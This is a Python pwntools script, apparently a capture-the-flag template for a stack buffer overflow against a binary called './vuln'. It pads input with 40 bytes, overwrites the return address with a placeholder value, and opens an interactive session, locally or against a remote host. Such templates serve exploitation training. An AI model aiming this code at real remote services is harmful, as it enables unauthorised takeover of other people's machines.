#!/usr/bin/env python3
from pwn import *
import sys

def solve():
    # Setup context (binary details/arch/os)
    context.arch = 'amd64'
    context.os = 'linux'
    context.terminal = ['tmux', 'splitw', '-h']
    
    # Adjust process path
    binary_path = "./vuln"
    
    # Check if target is remote or local
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # python3 exploit.py remote host port
        host = sys.argv[2]
        port = int(sys.argv[3])
        io = remote(host, port)
    else:
        # Local process debug/run
        elf = ELF(binary_path)
        io = process(binary_path)
        # gdb.attach(io, gdbscript='break main; continue') # uncomment to debug

    # Interactive interaction setup
    io.recvuntil(b"Enter input: ")
    
    # Craft payload
    offset = 40
    junk = b"A" * offset
    ret_addr = p64(0x401122) # replace with target address
    
    payload = junk + ret_addr
    io.sendline(payload)
    
    # Interact with shell
    io.interactive()

if __name__ == "__main__":
    solve()
